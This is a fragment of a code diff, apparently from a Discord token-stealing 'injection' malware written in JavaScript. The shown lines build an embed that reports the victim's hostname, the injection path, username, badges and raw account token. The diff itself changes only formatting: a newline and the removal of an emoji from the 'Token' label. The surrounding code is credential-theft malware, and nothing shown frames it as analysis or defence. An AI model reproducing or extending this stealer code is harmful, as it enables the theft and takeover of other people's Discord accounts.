@@ -142,7 +142,7 @@ async function firstTime() {
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
-                            value: `\`\`\`Hostname: \n${os.hostname()}\nInjection Info: \n${__dirname}\n\`\`\``,
+                            value: `\`\`\`Hostname: \n${os.hostname()}\n\nInjection Info: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }, {
                             name: "Username",
@@ -157,7 +157,7 @@ async function firstTime() {
                             value: `${getBadges(b.flags)}`,
                             inline: !1
                         }, {
-                            name: "<:1337:1093566172064129126> Token",
+                            name: " Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }],
